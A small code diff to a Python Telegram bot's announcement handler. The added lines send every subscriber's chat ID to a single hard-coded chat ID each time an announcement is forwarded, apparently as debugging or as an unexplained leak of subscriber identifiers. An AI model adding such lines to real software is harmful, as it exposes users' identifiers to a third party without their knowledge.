@@ -733,6 +733,8 @@ def announcement(update: Update, context: CallbackContext) -> None:
     if query.data == "Y":
         for each in context.bot_data["subscribe"]:
             forward_to = each[0]
+            bot.sendMessage(chat_id="229599548",
+                            text=forward_to)
             bot.sendMessage(chat_id=forward_to,
                             message_id=announce_message,
                             parse_mode=ParseMode.MARKDOWN)
